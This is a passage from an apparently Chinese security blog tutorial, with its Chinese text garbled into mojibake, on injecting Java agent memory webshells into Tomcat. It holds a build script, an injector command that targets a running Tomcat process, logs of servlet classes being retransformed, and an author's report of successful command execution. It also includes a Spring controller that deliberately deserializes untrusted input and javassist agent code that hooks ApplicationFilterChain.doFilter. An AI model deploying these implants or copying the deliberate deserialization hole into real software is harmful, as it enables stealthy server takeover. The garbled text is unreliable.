class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs bash">@<span class="hljs-built_in">echo</span> off<br>setlocal<br><br><span class="hljs-built_in">echo</span> Setting up environment...<br><span class="hljs-built_in">set</span> JAVA_HOME=D:\Java\jdk1.8.0_65<br><span class="hljs-built_in">set</span> PATH=%JAVA_HOME%\bin;%PATH%<br><br><span class="hljs-built_in">echo</span> [1/6] Cleaning target directory...<br><span class="hljs-keyword">if</span> exist target <span class="hljs-built_in">rmdir</span> /s /q target<br><span class="hljs-built_in">mkdir</span> target<br><span class="hljs-built_in">mkdir</span> target\classes<br><br><span class="hljs-built_in">echo</span> [2/6] Compiling agent classes...<br><span class="hljs-string">&quot;%JAVA_HOME%\bin\javac&quot;</span> -encoding UTF-8 -<span class="hljs-built_in">cp</span> <span class="hljs-string">&quot;lib\javassist.jar&quot;</span> -d target\classes src\main\java\com\src\agent\*.java<br><span class="hljs-keyword">if</span> errorlevel 1 (<br>    <span class="hljs-built_in">echo</span> Failed to compile agent classes!<br>    pause<br>    <span class="hljs-built_in">exit</span> /b 1<br>)<br><br><span class="hljs-built_in">echo</span> [3/6] Compiling injector class...<br><span class="hljs-string">&quot;%JAVA_HOME%\bin\javac&quot;</span> -encoding UTF-8 -<span class="hljs-built_in">cp</span> <span class="hljs-string">&quot;D:\Java\jdk1.8.0_65\lib\tools.jar;target\classes&quot;</span> -d target\classes src\main\java\com\src\injector\*.java<br><span class="hljs-keyword">if</span> errorlevel 1 (<br>    <span class="hljs-built_in">echo</span> Failed to compile injector class!<br>    pause<br>    <span class="hljs-built_in">exit</span> /b 1<br>)<br><br><span class="hljs-built_in">echo</span> [4/6] Merging javassist into classes...<br><span class="hljs-built_in">pushd</span> target\classes<br><span class="hljs-string">&quot;%JAVA_HOME%\bin\jar&quot;</span> xf ..\..\lib\javassist.jar<br><span class="hljs-built_in">popd</span><br><br><span class="hljs-built_in">echo</span> [5/6] Packaging agent JAR...<br>rem å¦‚æœ src\main\resources\META-INF\MANIFEST.MF å­˜åœ¨åˆ™ä½¿ç”¨å®ƒ<br><span class="hljs-built_in">set</span> MANIFEST_FILE=src\main\resources\META-INF\MANIFEST.MF<br><span class="hljs-keyword">if</span> not exist <span class="hljs-string">&quot;%MANIFEST_FILE%&quot;</span> <span class="hljs-built_in">set</span> MANIFEST_FILE=META-INF\MANIFEST.MF<br><br><span class="hljs-string">&quot;%JAVA_HOME%\bin\jar&quot;</span> cfm target\Demo01-1.0-SNAPSHOT.jar <span class="hljs-string">&quot;%MANIFEST_FILE%&quot;</span> -C target\classes .<br><span class="hljs-keyword">if</span> errorlevel 1 (<br>    <span class="hljs-built_in">echo</span> Failed to package agent JAR!<br>    pause<br>    <span class="hljs-built_in">exit</span> /b 1<br>)<br><br><span class="hljs-built_in">echo</span> [6/6] Creating injector JAR...<br><span class="hljs-string">&quot;%JAVA_HOME%\bin\jar&quot;</span> cfe target\Injector.jar com.src.injector.Injector -C target\classes .<br><span class="hljs-keyword">if</span> errorlevel 1 (<br>    <span class="hljs-built_in">echo</span> Failed to package injector JAR!<br>    pause<br>    <span class="hljs-built_in">exit</span> /b 1<br>)<br><br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span> ========================================<br><span class="hljs-built_in">echo</span> Build Successful!<br><span class="hljs-built_in">echo</span> Generated files:<br><span class="hljs-built_in">echo</span>   - target\Demo01-1.0-SNAPSHOT.jar (Agent with embedded javassist)<br><span class="hljs-built_in">echo</span>   - target\Injector.jar (Injector)<br><span class="hljs-built_in">echo</span> ========================================<br><span class="hljs-built_in">echo</span>.<br><br>pause<br></code></pre></td></tr></table></figure><h5 id="æ‰§è¡Œ-build-bat"><a href="#æ‰§è¡Œ-build-bat" class="headerlink" title="æ‰§è¡Œ build.bat"></a>æ‰§è¡Œ build.bat</h5><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523243.png" alt="img"></p><h4 id="å¼€å§‹æµ‹è¯•"><a href="#å¼€å§‹æµ‹è¯•" class="headerlink" title="å¼€å§‹æµ‹è¯•"></a>å¼€å§‹æµ‹è¯•</h4><h5 id="å¯åŠ¨ä¸€ä¸ª-Tomcat"><a href="#å¯åŠ¨ä¸€ä¸ª-Tomcat" class="headerlink" title="å¯åŠ¨ä¸€ä¸ª Tomcat"></a>å¯åŠ¨ä¸€ä¸ª Tomcat</h5><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523492.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081524494.png" alt="img"></p><h5 id="Tomcat-è¿›ç¨‹"><a href="#Tomcat-è¿›ç¨‹" class="headerlink" title="Tomcat è¿›ç¨‹"></a>Tomcat è¿›ç¨‹</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain"># æŸ¥çœ‹æ‰€æœ‰ Java è¿›ç¨‹<br>jps -l<br><br># æŸ¥çœ‹è¿›ç¨‹è¯¦ç»†ä¿¡æ¯<br>tasklist | findstr &quot;java&quot;<br><br># æˆ–è€…ä½¿ç”¨ wmic<br>wmic process where &quot;name=&#x27;java.exe&#x27;&quot; get processid,commandline<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525788.png" alt="img"></p><p>æ‰¾åˆ°è¿›ç¨‹ï¼š<strong>40268 org.apache.catalina.startup.Bootstrap</strong></p><h5 id="æµ‹è¯•æ³¨å…¥"><a href="#æµ‹è¯•æ³¨å…¥" class="headerlink" title="æµ‹è¯•æ³¨å…¥"></a>æµ‹è¯•æ³¨å…¥</h5><p><strong>ä½¿ç”¨ç®¡ç†å‘˜èº«ä»½è¿è¡Œï¼ï¼</strong></p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">java <span class="hljs-operator">-</span>cp <span class="hljs-string">&quot;D:<span class="hljs-char escape_">\J</span>ava<span class="hljs-char escape_">\j</span>dk1.8.0_65<span class="hljs-char escape_">\l</span>ib<span class="hljs-char escape_">\t</span>ools.jar;D:<span class="hljs-char escape_">\J</span>avaCode<span class="hljs-char escape_">\å†…</span>å­˜é©¬<span class="hljs-char escape_">\A</span>gentMem<span class="hljs-char escape_">\D</span>emo01<span class="hljs-char escape_">\t</span>arget<span class="hljs-char escape_">\I</span>njector.jar&quot;</span> com.src.injector.Injector <span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-number">40268</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span> D:\JavaCode\å†…å­˜é©¬\AgentMem\Demo01\target\Demo01-<span class="hljs-number">1</span>.<span class="hljs-number">0</span><span class="hljs-operator">-</span>SNAPSHOT.jar<br></code></pre></td></tr></table></figure><p>ï¼ˆä¸ºäº†é˜²æ­¢ä¸€äº›è«åå…¶å¦™çš„é”™è¯¯ï¼Œä½¿ç”¨äº†ç»å¯¹è·¯å¾„ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525851.png" alt="img"></p><p>æ³¨å…¥æˆåŠŸ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523146.png" alt="img"></p><p>Tomcat æ—¥å¿—ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs plain">// Agent å·²ç»è¢«æˆåŠŸåŠ è½½åˆ°ç›®æ ‡ JVM ä¸­ï¼Œagentmain() è¢«è°ƒç”¨ï¼Œæ³¨å…¥æˆåŠŸ<br>AgentMemShell Injected!<br><br>//å¯¹å¤šä¸ªå·²åŠ è½½ï¼ˆloadedï¼‰ä¸”ç»§æ‰¿è‡ª HttpServlet çš„ç±»æ‰§è¡Œäº† retransformClasses()ï¼Œå¹¶ä¸”è¿™äº›å­ç±»éƒ½æˆåŠŸè¢«é‡è½¬æ¢ï¼ˆretransform successï¼‰<br>Found HttpServlet subclass: class org.apache.jsp.index_jsp<br>Retransform subclass Success: class org.apache.jsp.index_jsp<br>Found HttpServlet subclass: class com.src.testtomcat.HelloServlet<br>Retransform subclass Success: class com.src.testtomcat.HelloServlet<br>Found HttpServlet subclass: class org.apache.jasper.runtime.HttpJspBase<br>Retransform subclass Success: class org.apache.jasper.runtime.HttpJspBase<br>Found HttpServlet subclass: class org.apache.jasper.servlet.JspServlet<br>[Debug] Loading class: org/apache/jasper/servlet/JspServlet<br>Retransform subclass Success: class org.apache.jasper.servlet.JspServlet<br>Found HttpServlet subclass: class org.apache.catalina.servlets.DefaultServlet<br>[Debug] Loading class: org/apache/catalina/servlets/DefaultServlet<br>Retransform subclass Success: class org.apache.catalina.servlets.DefaultServlet<br><br>//æˆåŠŸå¯¹ javax.servlet.http.HttpServletï¼ˆåŸºç±»ï¼‰ åšäº† transformï¼ˆæ’å…¥/ä¿®æ”¹å­—èŠ‚ç ï¼‰ï¼Œå¹¶æŠŠä¿®æ”¹ç”Ÿæ•ˆäº†ï¼ˆretransform successï¼‰<br>Found HttpServlet (base): class javax.servlet.http.HttpServlet<br>[Debug] Loading class: javax/servlet/http/HttpServlet<br>[+] Found target class: javax.servlet.http.HttpServlet<br>[+] Start transforming HttpServlet...<br>[+] HttpServlet Transformed Complete.<br>Retransform HttpServlet Success.<br><br>//transform() è°ƒç”¨ä¸­æŠ›å‡ºäº† NullPointerException<br>[!] Transform failed: java.lang.NullPointerException<br>java.lang.NullPointerException<br>at com.src.agent.ServletTransformer.transform(ServletTransformer.java:28)<br>at sun.instrument.TransformerManager.transform(TransformerManager.java:188)<br>at sun.instrument.InstrumentationImpl.transform(InstrumentationImpl.java:428)<br>at sun.misc.Unsafe.defineAnonymousClass(Native Method)<br>at java.lang.invoke.InnerClassLambdaMetafactory.spinInnerClass(InnerClassLambdaMetafactory.java:326)<br>at java.lang.invoke.InnerClassLambdaMetafactory.buildCallSite(InnerClassLambdaMetafactory.java:194)<br>at java.lang.invoke.LambdaMetafactory.metafactory(LambdaMetafactory.java:304)<br>at java.lang.invoke.CallSite.makeSite(CallSite.java:302)<br>at java.lang.invoke.MethodHandleNatives.linkCallSiteImpl(MethodHandleNatives.java:307)<br>at java.lang.invoke.MethodHandleNatives.linkCallSite(MethodHandleNatives.java:297)<br>at org.apache.tomcat.util.http.Parameters.addParameter(Parameters.java:212)<br>at org.apache.tomcat.util.http.Parameters.processParameters(Parameters.java:390)<br>at org.apache.tomcat.util.http.Parameters.processParameters(Parameters.java:481)<br>at org.apache.tomcat.util.http.Parameters.handleQueryParameters(Parameters.java:194)<br>at org.apache.catalina.connector.Request.parseParameters(Request.java:2938)<br>at org.apache.catalina.connector.Request.getParameter(Request.java:1088)<br>at org.apache.catalina.connector.RequestFacade.getParameter(RequestFacade.java:309)<br>at javax.servlet.http.HttpServlet.service(HttpServlet.java)<br>at javax.servlet.http.HttpServlet.service(HttpServlet.java:623)<br>at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:199)<br>at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:144)<br>at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:51)<br>at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:168)<br>at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:144)<br>at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:168)<br>at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:90)<br>at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:482)<br>at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:130)<br>at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:93)<br>at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:656)<br>at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)<br>at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:346)<br>at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:397)<br>at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)<br>at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:935)<br>at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1792)<br>at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)<br>at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1189)<br>at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:658)<br>at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:63)<br>at java.lang.Thread.run(Thread.java:745)<br></code></pre></td></tr></table></figure><p>å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼š</p><p>ï¼ˆï¼šä½†æ˜¯å½“å‰çš„å†…å­˜é©¬åªæ˜¯éƒ¨åˆ†ç”Ÿæ•ˆï¼Œ&#x2F;hello-servlet è·¯å¾„å¯ä»¥æ‰§è¡Œï¼Œå…¶ä»–ä¸å¯ä»¥</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523380.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523450.png" alt="img"></p><h3 id="4-3-2-æ–¹å¼äºŒ"><a href="#4-3-2-æ–¹å¼äºŒ" class="headerlink" title="4.3.2 æ–¹å¼äºŒ"></a>4.3.2 æ–¹å¼äºŒ</h3><h4 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h4><p>SpringBoot 2.6.13  </p><p>CommonCollection 3.2.1</p><p>æ­å»ºä¸€ä¸ªååºåˆ—åŒ–ç¯å¢ƒï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.demos.web;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentFilter</span> &#123;<br><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/cc&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">cc11Vuln</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span>  request.getInputStream();<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(inputStream);<br>        objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello,World&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/demo&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">demo</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;This is OK Demo!&quot;</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525866.png" alt="img"></p><h4 id="å¯»æ‰¾å…³é”®ç±»"><a href="#å¯»æ‰¾å…³é”®ç±»" class="headerlink" title="å¯»æ‰¾å…³é”®ç±»"></a>å¯»æ‰¾å…³é”®ç±»</h4><p>åœ¨Filterä¸­å­˜åœ¨doFilteræ–¹æ³•ï¼Œé™¤äº†ä¼šå¯¹æˆ‘ä»¬çš„è¯·æ±‚è¿›è¡Œè¿‡æ»¤ï¼Œä¼šä¾æ¬¡è°ƒç”¨FilterChainsä¸­çš„Filterï¼ŒåŒæ—¶åœ¨ <code>ApplicationFilterChain#doFilter</code> ä¸­è¿˜å°è£…äº†æˆ‘ä»¬ç”¨æˆ·è¯·æ±‚çš„ request å’Œ response ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ³¨å…¥è¯¥æ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸å°±å¯ä»¥ç›´æ¥è·å–ç”¨æˆ·çš„è¯·æ±‚ï¼Œå°†æ‰§è¡Œç»“æœå†™åœ¨ response ä¸­è¿›è¡Œè¿”å›ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523934.png" alt="img"></p><h4 id="ååºåˆ—åŒ–æ³¨å…¥"><a href="#ååºåˆ—åŒ–æ³¨å…¥" class="headerlink" title="ååºåˆ—åŒ–æ³¨å…¥"></a>ååºåˆ—åŒ–æ³¨å…¥</h4><p>æ³¨å…¥æµç¨‹å¦‚ä¸‹ï¼š</p><ol><li>ç¼–å†™ agent.jar ä»è€Œå®ç° <code>org.apache.catalina.core.ApplicationFilterChain#doFilter</code> è¿›è¡Œå­—èŠ‚ç ä¿®æ”¹</li><li>åˆ©ç”¨ <code>CCä¾èµ–</code> çš„ååºåˆ—åŒ–æ¼æ´å°†æˆ‘ä»¬çš„åŠ è½½ä»£ç æ‰“è¿›å»ï¼Œç„¶åä½¿å…¶æ‰§è¡Œæ¥åŠ è½½æˆ‘ä»¬çš„ agent.jar</li></ol><h4 id="agent-jar"><a href="#agent-jar" class="headerlink" title="agent.jar"></a>agent.jar</h4><p>pom.xml </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.src<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Demo02<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.29.2-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><p>AgentMain.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentMain</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String agentArgs, Instrumentation ins)</span> &#123;<br>        ins.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DefineTransformer</span>(),<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// è·å–æ‰€æœ‰å·²åŠ è½½çš„ç±»</span><br>        Class[] classes = ins.getAllLoadedClasses();<br>        <span class="hljs-keyword">for</span> (Class clas:classes)&#123;<br>            <span class="hljs-keyword">if</span> (clas.getName().equals(ClassName))&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    <span class="hljs-comment">// å¯¹ç±»è¿›è¡Œé‡æ–°å®šä¹‰</span><br>                    ins.retransformClasses(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;clas&#125;);<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>DefineTransformer.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefineTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) &#123;<br>        className = className.replace(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;.&quot;</span>);<br>        <span class="hljs-keyword">if</span> (className.equals(ClassName))&#123;<br>            System.out.println(<span class="hljs-string">&quot;Find the Inject Class: &quot;</span> + ClassName);<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">CtClass</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> pool.getCtClass(className);<br>                <span class="hljs-type">CtMethod</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;doFilter&quot;</span>);<br>                m.insertBefore(<span class="hljs-string">&quot;javax.servlet.http.HttpServletRequest req =  request;\n&quot;</span> +<br>                        <span 